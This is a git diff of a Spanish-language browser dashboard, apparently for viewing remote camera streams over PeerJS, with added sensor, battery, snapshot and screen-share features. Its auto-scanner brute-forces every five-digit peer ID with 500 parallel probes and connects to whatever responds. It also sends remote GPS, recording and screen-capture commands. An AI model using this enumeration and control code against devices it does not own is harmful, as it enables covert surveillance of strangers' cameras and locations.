+function handleSensor(camId, d) {
+  if (!cameras[camId]) return;
+  cameras[camId].sensorData = d;
+  if (selectedId === camId) renderSensorPanel();
+}
+
+function handleSnapshot(camId, msg) {
+  if (!msg.data) return;
+  const img = document.getElementById('snapPreview');
+  if (img) {
+    img.src = msg.data;
+    img.style.display = 'block';
+    // Auto-download
+    const a = document.createElement('a');
+    a.href = msg.data;
+    a.download = `streamlink-snap-${camId}-${Date.now()}.jpg`;
+    a.click();
+    toast(`Snapshot de cámara ${camId} recibido`, 'success');
+  }
+}
+
+function flashBtn(id, cls) {
+  const btn = document.getElementById(id);
+  if (!btn) return;
+  btn.classList.add(cls);
+  setTimeout(() => btn.classList.remove(cls), 700);
+}
+
+// ── ATTACH STREAM ──
+function attachStream(camId, stream) {
+  const gv = document.getElementById(`gvid-${camId}`);
+  if (gv) { gv.srcObject = stream; gv.muted = false; gv.volume = cameras[camId]?.volume ?? 1; gv.play().catch(() => {}); }
+  const tv = document.getElementById(`tvid-${camId}`);
+  if (tv) { tv.srcObject = stream; tv.play().catch(() => {}); }
 }
 
 // ── ESTADÍSTICAS ──
@@ -782,12 +800,12 @@ function startCamStats(camId, call) {
           const bytes = r.bytesReceived || 0;
           const diff  = bytes - (cameras[camId]?.prevBytes || 0);
           if (cameras[camId]) cameras[camId].prevBytes = bytes;
-          const kbps = Math.round((diff * 8) / 1024);
+          const kbps  = Math.round((diff * 8) / 1024);
           if (cameras[camId]) {
             cameras[camId].stats.bit = kbps > 0 ? kbps + ' kbps' : '—';
-            const lost = r.packetsLost || 0;
-            const tot  = (r.packetsReceived || 0) + lost;
-            const lr   = tot > 0 ? ((lost / tot) * 100).toFixed(1) : '0.0';
+            const lost  = r.packetsLost || 0;
+            const tot   = (r.packetsReceived || 0) + lost;
+            const lr    = tot > 0 ? ((lost / tot) * 100).toFixed(1) : '0.0';
             cameras[camId].stats.pkt = lr + '%';
             if (r.frameWidth) cameras[camId].stats.res = `${r.frameWidth}×${r.frameHeight}`;
             cameras[camId].stats.q = parseFloat(lr) < 1 && kbps > 200 ? 'Excelente'
@@ -809,10 +827,7 @@ function startCamStats(camId, call) {
   }, 2000);
 }
 function stopCamStats(camId) {
-  if (cameras[camId]?.statsInterval) {
-    clearInterval(cameras[camId].statsInterval);
-    cameras[camId].statsInterval = null;
-  }
+  if (cameras[camId]?.statsInterval) { clearInterval(cameras[camId].statsInterval); cameras[camId].statsInterval = null; }
 }
 function startViewTimer(camId) {
   stopViewTimer(camId);
@@ -828,10 +843,7 @@ function startViewTimer(camId) {
   }, 1000);
 }
 function stopViewTimer(camId) {
-  if (cameras[camId]?.viewTimerInterval) {
-    clearInterval(cameras[camId].viewTimerInterval);
-    cameras[camId].viewTimerInterval = null;
-  }
+  if (cameras[camId]?.viewTimerInterval) { clearInterval(cameras[camId].viewTimerInterval); cameras[camId].viewTimerInterval = null; }
 }
 
 // ── LISTA DE CÁMARAS ──
@@ -840,7 +852,7 @@ function renderCamList() {
   const ids  = Object.keys(cameras);
   if (ids.length === 0) {
     list.innerHTML = `<div style="font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--text3);text-align:center;padding:20px 8px;">
-      Usá el escáner o añadí un código de cámara manualmente.</div>`;
+      Añadí un código de cámara o usá el escáner.</div>`;
     return;
   }
   list.innerHTML = '';
@@ -865,8 +877,9 @@ function renderCamList() {
       </div>
       <div class="cam-item-footer">
         <div class="cam-footer-stat">ID: <span>${id}</span></div>
-        ${cam.torchState  ? '<div class="cam-footer-stat" style="margin-left:auto;color:var(--yellow)">⚡</div>' : ''}
-        ${cam.gps         ? '<div class="cam-footer-stat" style="color:var(--green)">📍</div>' : ''}
+        ${cam.torchState ? '<div class="cam-footer-stat" style="margin-left:auto;color:var(--yellow)">⚡</div>' : ''}
+        ${cam.gps ? '<div class="cam-footer-stat" style="color:var(--green)">📍</div>' : ''}
+        ${cam.sensorData ? '<div class="cam-footer-stat" style="color:var(--cyan)">📡</div>' : ''}
       </div>`;
     el.addEventListener('click', () => selectCamera(id));
     list.appendChild(el);
@@ -879,10 +892,9 @@ function renderCamList() {
 
 // ── GRID ──
 function renderGrid() {
-  const grid       = document.getElementById('camGrid');
+  const grid = document.getElementById('camGrid');
   const emptyState = document.getElementById('emptyState');
   const ids = Object.keys(cameras);
-
   if (ids.length === 0) {
     grid.style.display = 'none'; emptyState.style.display = 'flex'; return;
   }
@@ -905,7 +917,7 @@ function renderGrid() {
           style="width:100%;height:100%;object-fit:contain;filter:brightness(${cam.brightness || 1})"></video>
         <div class="cell-hud-top">
           <div class="cell-live-badge">● LIVE</div>
-          <div class="cell-cam-name">${cam.name}${cam.torchState ? ' ⚡' : ''}</div>
+          <div class="cell-cam-name">${cam.name}${cam.torchState ? ' ⚡' : ''}${cam.sensorData ? ' 📡' : ''}</div>
         </div>
         <div class="cell-hud-bot">
           <div>
@@ -938,10 +950,8 @@ function renderGrid() {
         </div>`;
     } else if (cam.status === 'connecting') {
       cell.innerHTML = `<div class="cam-cell-overlay">
-        <div style="display:flex;flex-direction:column;align-items:center;gap:8px">
-          <div class="mini-spinner"></div>
-          <div class="mini-spinner-txt">Conectando ${id}…</div>
-        </div></div>`;
+        <div class="mini-spinner"></div>
+        <div class="mini-spinner-txt">Conectando ${id}…</div></div>`;
     } else {
       cell.innerHTML = `<div class="cam-cell-overlay">
         <div class="mini-spinner-txt" style="color:var(--red)">Desconectado</div>
@@ -957,7 +967,7 @@ function renderGrid() {
       const gv = document.getElementById(`gvid-${id}`);
       if (gv) {
         gv.srcObject = cam.stream;
-        gv.muted  = false;
+        gv.muted = false;
         gv.volume = cam.volume || 1;
         gv.play().catch(() => {});
       }
@@ -998,7 +1008,7 @@ function updateCellGps(camId) {
   if (cam.gps && badge) {
     badge.textContent = `📍 ${(+cam.gps.lat).toFixed(5)}, ${(+cam.gps.lng).toFixed(5)} ±${cam.gps.acc != null ? (+cam.gps.acc).toFixed(0) : '?'}m`;
   } else if (cam.gps && !badge) {
-    renderGrid(); // GPS llegó antes de que hubiera badge: re-render
+    renderGrid();
   }
 }
 
@@ -1007,10 +1017,8 @@ function selectCamera(id) {
   selectedId = id;
   document.querySelectorAll('.cam-item').forEach(el => el.classList.remove('active'));
   document.querySelectorAll('.cam-cell').forEach(el  => el.classList.remove('selected'));
-  const ci   = document.getElementById(`ci-${id}`);
-  if (ci)   ci.classList.add('active');
-  const cell = document.getElementById(`cell-${id}`);
-  if (cell) cell.classList.add('selected');
+  const ci   = document.getElementById(`ci-${id}`);   if (ci)   ci.classList.add('active');
+  const cell = document.getElementById(`cell-${id}`); if (cell) cell.classList.add('selected');
   renderDetailPanel();
 }
 
@@ -1026,6 +1034,9 @@ function renderDetailPanel() {
     updateDetailStats();
     document.getElementById('controlsContent').style.display = 'none';
     document.getElementById('controlsActive').style.display  = 'block';
+    // Reset snapshot preview
+    const snapPrev = document.getElementById('snapPreview');
+    if (snapPrev) snapPrev.style.display = 'none';
     bindControls(selectedId);
   } else {
     document.getElementById('noSelectionMsg').style.display  = 'block';
@@ -1035,6 +1046,7 @@ function renderDetailPanel() {
     document.getElementById('controlsActive').style.display  = 'none';
   }
   renderGpsPanel();
+  renderSensorPanel();
   renderDevicePanel();
 }
 
@@ -1075,6 +1087,21 @@ function renderGpsPanel() {
   };
 }
 
+function renderSensorPanel() {
+  const cam = selectedId ? cameras[selectedId] : null;
+  const sd  = cam?.sensorData;
+  if (!sd) {
+    document.getElementById('sensorNoData').style.display = 'block';
+    document.getElementById('sensorCard').style.display   = 'none';
+    return;
+  }
+  document.getElementById('sensorNoData').style.display = 'none';
+  document.getElementById('sensorCard').style.display   = 'block';
+  document.getElementById('s-alpha').textContent = sd.alpha != null ? (+sd.alpha).toFixed(1) + '°' : '—';
+  document.getElementById('s-beta').textContent  = sd.beta  != null ? (+sd.beta).toFixed(1)  + '°' : '—';
+  document.getElementById('s-gamma').textContent = sd.gamma != null ? (+sd.gamma).toFixed(1) + '°' : '—';
+}
+
 function renderDevicePanel() {
   const cam = selectedId ? cameras[selectedId] : null;
   const d   = cam?.deviceInfo;
@@ -1086,8 +1113,7 @@ function renderDevicePanel() {
   document.getElementById('diWait').style.display = 'none';
   document.getElementById('diCard').style.display = 'block';
   const f = (id, val, cls) => {
-    const el = document.getElementById(id);
-    if (!el) return;
+    const el = document.getElementById(id); if (!el) return;
     el.textContent = val || '—';
     if (cls) el.className = 'di-val ' + cls;
   };
@@ -1095,12 +1121,13 @@ function renderDevicePanel() {
   f('di-browser',  d.browser);
   f('di-os',       d.os);
   f('di-screen',   d.screen);
-  f('di-mem',      d.memory ? d.memory + ' GB' : null);
-  f('di-cpu',      d.cores  ? d.cores  + ' núcleos' : null);
+  f('di-mem',      d.memory  ? d.memory  + ' GB'       : null);
+  f('di-cpu',      d.cores   ? d.cores   + ' núcleos'  : null);
   f('di-conn',     d.conn);
   f('di-lang',     d.lang);
   f('di-tz',       d.tz);
   f('di-touch',    d.touch);
+  f('di-battery',  d.battery ? d.battery + (d.charging ? ' ⚡' : '') : null);
   f('di-online',   d.online ? 'Sí' : 'No', d.online ? 'g' : 'r');
 }
 
@@ -1110,38 +1137,45 @@ function bindControls(camId) {
   if (!cam) return;
   updateRemoteControlUI(camId);
 
-  // Voltear (remoto)
+  // Voltear
   document.getElementById('ctrl-remote-flip').onclick = () => {
     if (sendCamCommand(camId, 'flip')) toast('Volteando cámara…', 'info');
   };
 
-  // Flash (remoto)
+  // Flash
   document.getElementById('ctrl-remote-torch').onclick = () => {
-    const cam = cameras[camId];
-    if (!cam) return;
+    const cam = cameras[camId]; if (!cam) return;
     const want = !cam.torchState;
     if (sendCamCommand(camId, 'torch', want)) {
-      cam.torchState = want; // Optimista; cmdAck lo confirma
+      cam.torchState = want;
       updateRemoteControlUI(camId);
       toast(want ? 'Flash ON enviado' : 'Flash OFF enviado', 'info');
     }
   };
 
-  // GPS (remoto)
+  // GPS
   document.getElementById('ctrl-remote-gps').onclick = () => {
-    const cam = cameras[camId];
-    if (!cam) return;
+    const cam = cameras[camId]; if (!cam) return;
     const action = cam.gpsActive ? 'gps_stop' : 'gps_start';
     if (sendCamCommand(camId, action)) {
       cam.gpsActive = !cam.gpsActive;
       if (!cam.gpsActive) { cam.gps = null; renderGpsPanel(); }
       updateRemoteControlUI(camId);
-      toast(cam.gpsActive ? 'GPS activado en cámara' : 'GPS desactivado', 'info');
+      toast(cam.gpsActive ? 'GPS activado' : 'GPS desactivado', 'info');
     }
   };
 
-  // Snapshot (local)
-  document.getElementById('ctrl-snap').onclick = () => snapCell(camId);
+  // Snapshot (local del grid)
+  document.getElementById('ctrl-snap').onclick = () => {
+    // Primero intentamos captura local
+    const gv = document.getElementById(`gvid-${camId}`);
+    if (gv && gv.videoWidth) {
+      snapCell(camId);
+    } else {
+      // Pedimos snapshot a la cámara
+      if (sendCamCommand(camId, 'snapshot')) toast('Solicitando snapshot…', 'info');
+    }
+  };
 
   // PiP
   document.getElementById('ctrl-pip').onclick = async () => {
@@ -1153,10 +1187,19 @@ function bindControls(camId) {
     } catch (e) { toast('PiP no disponible', 'error'); }
   };
 
-  // Grabación (remoto)
+  // Screen share remoto
+  document.getElementById('ctrl-screen').onclick = () => {
+    const cam = cameras[camId]; if (!cam) return;
+    // Enviamos comando toggle
+    if (sendCamCommand(camId, 'screen_toggle')) {
+      toast('Solicitando pantalla de la cámara…', 'info');
+      document.getElementById('ctrl-screen').classList.toggle('act-cyan');
+    }
+  };
+
+  // Grabación
   document.getElementById('ctrl-rec').onclick = () => {
-    const cam = cameras[camId];
-    if (!cam) return;
+    const cam = cameras[camId]; if (!cam) return;
     if (cam.isRecording) {
       if (sendCamCommand(camId, 'record_stop')) {
         cam.isRecording = false; updateRemoteControlUI(camId);
@@ -1170,15 +1213,14 @@ function bindControls(camId) {
     }
   };
 
-  // Volumen (local)
+  // Volumen local
   const volSlider = document.getElementById('ctrl-vol');
   const volVal    = document.getElementById('ctrl-vol-val');
   if (volSlider) {
     volSlider.value = cam.volume ?? 1;
     volVal.textContent = Math.round((cam.volume ?? 1) * 100) + '%';
     volSlider.oninput = () => {
-      const cam = cameras[camId];
-      if (!cam) return;
+      const cam = cameras[camId]; if (!cam) return;
       cam.volume = parseFloat(volSlider.value);
       volVal.textContent = Math.round(cam.volume * 100) + '%';
       const gv = document.getElementById(`gvid-${camId}`);
@@ -1186,7 +1228,7 @@ function bindControls(camId) {
     };
   }
 
-  // Zoom (remoto)
+  // Zoom remoto
   const zoomSlider = document.getElementById('ctrl-zoom');
   const zoomVal    = document.getElementById('ctrl-zoom-val');
   if (zoomSlider) {
@@ -1194,8 +1236,7 @@ function bindControls(camId) {
     zoomVal.textContent = (cam.zoom || 1).toFixed(1) + '×';
     let zoomDebounce;
     zoomSlider.oninput = () => {
-      const cam = cameras[camId];
-      if (!cam) return;
+      const cam = cameras[camId]; if (!cam) return;
       cam.zoom = parseFloat(zoomSlider.value);
       zoomVal.textContent = cam.zoom.toFixed(1) + '×';
       clearTimeout(zoomDebounce);
@@ -1203,7 +1244,7 @@ function bindControls(camId) {
     };
   }
 
-  // Brillo (remoto + local preview)
+  // Brillo
   const briSlider = document.getElementById('ctrl-bri');
   const briVal    = document.getElementById('ctrl-bri-val');
   if (briSlider) {
@@ -1211,8 +1252,7 @@ function bindControls(camId) {
     briVal.textContent = (cam.brightness || 1).toFixed(2) + '×';
     let briDebounce;
     briSlider.oninput = () => {
-      const cam = cameras[camId];
-      if (!cam) return;
+      const cam = cameras[camId]; if (!cam) return;
       cam.brightness = parseFloat(briSlider.value);
       briVal.textContent = cam.brightness.toFixed(2) + '×';
       const gv = document.getElementById(`gvid-${camId}`);
@@ -1229,8 +1269,7 @@ function bindControls(camId) {
 }
 
 function updateRemoteControlUI(camId) {
-  const cam = cameras[camId];
-  if (!cam) return;
+  const cam = cameras[camId]; if (!cam) return;
 
   const torchBtn = document.getElementById('ctrl-remote-torch');
   if (torchBtn) {
@@ -1244,8 +1283,9 @@ function updateRemoteControlUI(camId) {
   if (gpsBtn) {
     gpsBtn.className = 'ctrl-btn' + (cam.gpsActive ? ' act-green' : '');
     gpsBtn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-      <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/>
-      </svg>${cam.gpsActive ? 'GPS ON' : 'GPS'}`;
+      <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/>
+      <circle cx="12" cy="10" r="3"/></svg>
+      ${cam.gpsActive ? 'GPS ON' : 'GPS'}`;
   }
 
   const recBtn = document.getElementById('ctrl-rec');
@@ -1263,7 +1303,7 @@ function updateRemoteControlUI(camId) {
   }
 }
 
-// ── SNAPSHOT ──
+// ── SNAPSHOT LOCAL ──
 function snapCell(camId, event) {
   if (event) event.stopPropagation();
   const gv = document.getElementById(`gvid-${camId}`);
@@ -1285,8 +1325,7 @@ function snapCell(camId, event) {
 
 function focusCell(camId, event) {
   if (event) event.stopPropagation();
-  selectCamera(camId);
-  setLayout(1);
+  selectCamera(camId); setLayout(1);
 }
 
 // ── LAYOUT ──
@@ -1307,59 +1346,39 @@ function toggleAllFullscreen() {
   else document.exitFullscreen();
 }
 
-// ══════════════════════════════════════════════════════════
-//  AUTO SCANNER OPTIMIZADO
-//  Estrategia: lotes de 500 conexiones paralelas simultáneas
-//  con timeout de 900ms por peer → cubre 100.000 IDs en ~3 min
-// ══════════════════════════════════════════════════════════
-const SCAN_CONCURRENCY = 500;  // conexiones simultáneas
-const SCAN_TIMEOUT_MS  = 900;  // ms de espera por peer
+// ══════════════════════════
+//  AUTO SCANNER
+// ══════════════════════════
+const SCAN_CONCURRENCY = 500;
+const SCAN_TIMEOUT_MS  = 900;
 const SCAN_TOTAL       = 100000;
-
-let scanFoundCount = 0;
-let scanChecked    = 0;
-let scanStartTime  = 0;
+let scanFoundCount = 0, scanChecked = 0, scanStartTime = 0;
 
 async function autoScan() {
   if (isScanning) { stopScan(); return; }
-  isScanning  = true;
-  scanAbort   = false;
-  scanFoundCount = 0;
-  scanChecked    = 0;
-  scanStartTime  = Date.now();
-
+  isScanning = true; scanAbort = false;
+  scanFoundCount = 0; scanChecked = 0; scanStartTime = Date.now();
   document.getElementById('scanBtn').classList.add('scanning');
   document.getElementById('scanBtnLabel').textContent = '■ Detener escaneo';
-  document.getElementById('scanStats').textContent = '';
   updateTopStats();
   toast('Escáner iniciado — 500 conexiones paralelas', 'info', 4000);
 
   initAdminPeer(async () => {
-    // Genera array de todos los IDs aleatorizado para distribución uniforme
-    // (mejor probabilidad de encontrar cámaras rápido al inicio)
     const allIds = Array.from({ length: SCAN_TOTAL }, (_, i) => i.toString().padStart(5, '0'));
     shuffleArray(allIds);
 
-    // Procesa en lotes de SCAN_CONCURRENCY
     for (let offset = 0; offset < SCAN_TOTAL && !scanAbort; offset += SCAN_CONCURRENCY) {
       const batch = allIds.slice(offset, offset + SCAN_CONCURRENCY).filter(id => !cameras[id]);
       if (batch.length === 0) { scanChecked += SCAN_CONCURRENCY; continue; }
-
       await Promise.allSettled(batch.map(id => probePeerFast(id)));
-
       scanChecked = Math.min(offset + SCAN_CONCURRENCY, SCAN_TOTAL);
-      const pct   = Math.round((scanChecked / SCAN_TOTAL) * 100);
+      const pct     = Math.round((scanChecked / SCAN_TOTAL) * 100);
       const elapsed = ((Date.now() - scanStartTime) / 1000).toFixed(0);
-      const eta     = elapsed > 0
-        ? Math.round(elapsed / (scanChecked / SCAN_TOTAL) - elapsed)
-        : '?';
-
+      const eta     = elapsed > 0 ? Math.round(elapsed / (scanChecked / SCAN_TOTAL) - elapsed) : '?';
       document.getElementById('scanProgressBar').style.width = pct + '%';
       document.getElementById('scanBtnLabel').textContent = `■ Detener — ${pct}%`;
       document.getElementById('scanStats').textContent =
         `${scanChecked.toLocaleString()} de ${SCAN_TOTAL.toLocaleString()} · ${scanFoundCount} halladas · ETA ${eta}s`;
-
-      // Pequeña pausa entre lotes para no saturar el navegador
       if (!scanAbort) await new Promise(r => setTimeout(r, 20));
     }
 
@@ -1370,8 +1389,7 @@ async function autoScan() {
         scanFoundCount > 0
           ? `✓ Escaneo completo en ${elapsed}s — ${scanFoundCount} cámara(s) encontrada(s)`
           : `Escaneo completo en ${elapsed}s — Sin cámaras detectadas`,
-        scanFoundCount > 0 ? 'success' : 'info',
-        5000
+        scanFoundCount > 0 ? 'success' : 'info', 5000
       );
     }
     stopScan();
@@ -1383,31 +1401,20 @@ function probePeerFast(id) {
   return new Promise(resolve => {
     let done = false;
     const finish = () => { if (!done) { done = true; resolve(); } };
-
     let conn;
-    try {
-      conn = adminPeer.connect(id, { reliable: false, label: 'probe', serialization: 'none' });
-    } catch (e) { return finish(); }
-
-    const timer = setTimeout(() => {
-      try { conn?.close(); } catch (e) {}
-      finish();
-    }, SCAN_TIMEOUT_MS);
-
+    try { conn = adminPeer.connect(id, { reliable: false, label: 'probe', serialization: 'none' }); }
+    catch (e) { return finish(); }
+    const timer = setTimeout(() => { try { conn?.close(); } catch (e) {} finish(); }, SCAN_TIMEOUT_MS);
     conn.on('open', () => {
       clearTimeout(timer);
       try { conn.close(); } catch (e) {}
-      if (!cameras[id] && !scanAbort) {
-        scanFoundCount++;
-        connectCamera(id);
-      }
+      if (!cameras[id] && !scanAbort) { scanFoundCount++; connectCamera(id); }
       finish();
     });
     conn.on('error', () => { clearTimeout(timer); finish(); });
   });
 }
 
-// Fisher-Yates shuffle para aleatorizar el orden de IDs
 function shuffleArray(arr) {
   for (let i = arr.length - 1; i > 0; i--) {
     const j = Math.floor(Math.random() * (i + 1));
@@ -1417,8 +1424,7 @@ function shuffleArray(arr) {
 }
 
 function stopScan() {
-  isScanning = false;
-  scanAbort  = true;
+  isScanning = false; scanAbort = true;
   document.getElementById('scanBtn').classList.remove('scanning');
   document.getElementById('scanBtnLabel').textContent = 'Escanear rango (00000–99999)';
   document.getElementById('scanProgressBar').style.width = '0%';
@@ -1429,10 +1435,7 @@ function stopScan() {
 // ── EVENTOS ──
 document.getElementById('addCamBtn').addEventListener('click', () => {
   const code = document.getElementById('manualCode').value.trim();
-  if (code) {
-    connectCamera(code);
-    document.getElementById('manualCode').value = '';
-  }
+  if (code) { connectCamera(code); document.getElementById('manualCode').value = ''; }
 });
 document.getElementById('manualCode').addEventListener('keydown', e => {
   if (e.key === 'Enter') document.getElementById('addCamBtn').click();
